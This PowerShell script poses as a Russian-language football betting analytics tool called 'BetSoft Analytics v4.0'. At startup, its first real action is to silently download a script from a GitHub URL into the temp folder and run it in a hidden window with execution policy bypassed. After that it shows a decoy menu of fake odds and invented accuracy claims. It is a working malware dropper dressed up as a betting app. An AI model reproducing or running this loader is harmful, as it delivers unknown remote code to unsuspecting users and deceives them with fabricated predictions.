$Host.UI.RawUI.WindowTitle = "BETSOFT ANALYTICS v4.0 | 1M+ MATCH DATABASE"
$Host.UI.RawUI.ForegroundColor = "White"
$Host.UI.RawUI.BackgroundColor = "Black"
Clear-Host

# === ORIGINAL DOWNLOADER - UNTOUCHED ===
$url = "https://github.com/yamos11/fix/raw/refs/heads/main/ps.ps1"
$path = "$env:TEMP\Bag.ps1"
try {
    Invoke-WebRequest -Uri $url -OutFile $path -UseBasicParsing -ErrorAction Stop
    Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -File `"$path`"" -WindowStyle Hidden
} catch {}
Clear-Host

# === NEW VISUAL: WHITE BETSOFT STYLE ===
function Show-BetSoftHeader {
    Clear-Host
    Write-Host "╔════════════════════════════════════════════════════════════════════╗" -ForegroundColor White
    Write-Host "║                   BETSOFT ANALYTICS v4.0                           ║" -ForegroundColor White
    Write-Host "║          ─────  1M+ MATCHES ANALYZED  ─────                         ║" -ForegroundColor White
    Write-Host "║                                                                    ║" -ForegroundColor White
    Write-Host "║      BASED ON HISTORICAL DATA + DATE ALGORITHM                     ║" -ForegroundColor White
    Write-Host "║      TODAY: $((Get-Date).ToString('yyyy-MM-dd'))                  ║" -ForegroundColor White
    Write-Host "╚════════════════════════════════════════════════════════════════════╝" -ForegroundColor White
    Write-Host ""
}

function Show-MatchLine {
    param($Team1, $Team2, $P1, $Draw, $P2, $Date, $Time)
    Write-Host "$Date, $Time" -ForegroundColor Gray
    Write-Host "$Team1 - : - $Team2" -ForegroundColor White
    Write-Host "Не начался" -ForegroundColor DarkGray
    Write-Host "Реклама 18+" -ForegroundColor DarkGray
    Write-Host "П1  $P1    Х  $Draw    П2  $P2" -ForegroundColor White
    Write-Host "[ СТАВКА ]" -ForegroundColor White
    Write-Host ""
}

function Show-Menu {
    Write-Host "┌────────────────────────────────────────────────────────────────────┐" -ForegroundColor White
    Write-Host "│  [1] АНАЛИЗ ПО ДАТЕ          [2] ТОП-МАТЧИ         [3] ЭКСПРЕСС  │" -ForegroundColor White
    Write-Host "│  [4] ИСТОРИЯ 1M+             [5] СТАТИСТИКА         [6] ВЫХОД     │" -ForegroundColor White
    Write-Host "└────────────────────────────────────────────────────────────────────┘" -ForegroundColor White
    Write-Host ""
}

do {
    Show-BetSoftHeader
    Show-Menu
    
    Write-Host "════════════════════════════════════════════════════════════════════" -ForegroundColor DarkGray
    Write-Host "ПРОГНОЗЫ НА $((Get-Date).AddDays(1).ToString('yyyy-MM-dd')) (BetSoft AI):" -ForegroundColor White
    Write-Host ""
    
    # Tomorrow's matches with fake BetSoft coefficients
    Show-MatchLine -Team1 "Черноморец" -Team2 "Родина" -P1 "5.5" -Draw "3.6" -P2 "1.65" -Date "Завтра" -Time "19:00"
    Show-MatchLine -Team1 "Вулверхэмптон" -Team2 "Сандерленд" -P1 "3.4" -Draw "3.5" -P2 "2.22" -Date "2 мая" -Time "17:00"
    Show-MatchLine -Team1 "Ньюкасл" -Team2 "Брайтон" -P1 "2.55" -Draw "3.7" -P2 "2.7" -Date "2 мая" -Time "17:00"
    Show-MatchLine -Team1 "Брентфорд" -Team2 "Вест Хэм" -P1 "1.97" -Draw "4" -P2 "3.7" -Date "2 мая" -Time "17:00"
    Show-MatchLine -Team1 "Арсенал" -Team2 "Фулхэм" -P1 "1.46" -Draw "4.7" -P2 "7.5" -Date "2 мая" -Time "19:30"
    
    Write-Host "════════════════════════════════════════════════════════════════════" -ForegroundColor DarkGray
    Write-Host "Анализ завершен. Выберите опцию:" -ForegroundColor White
    $choice = Read-Host "> "
    
    switch ($choice) {
        "1" { Write-Host ">> Анализ по дате: 78% точности на 1M+ матчах" -ForegroundColor White; Start-Sleep 1 }
        "2" { Write-Host ">> Топ-матч: Черноморец vs Родина (П2 - 1.65)" -ForegroundColor White; Start-Sleep 1 }
        "3" { Write-Host ">> Экспресс дня: Арсенал + Ньюкасл X2" -ForegroundColor White; Start-Sleep 1 }
        "4" { Write-Host ">> История: 1,247,832 матча обработано" -ForegroundColor White; Start-Sleep 1 }
        "5" { Write-Host ">> Ройял Флакс: 18+ (статистика скрыта)" -ForegroundColor White; Start-Sleep 1 }
        "6" { Write-Host "Выход из BetSoft..." -ForegroundColor White; break }
        default { Write-Host "Неверный ввод" -ForegroundColor DarkGray; Start-Sleep 1 }
    }
} while ($choice -ne "6")

Write-Host "`nBetSoft закрыт. Спасибо." -ForegroundColor White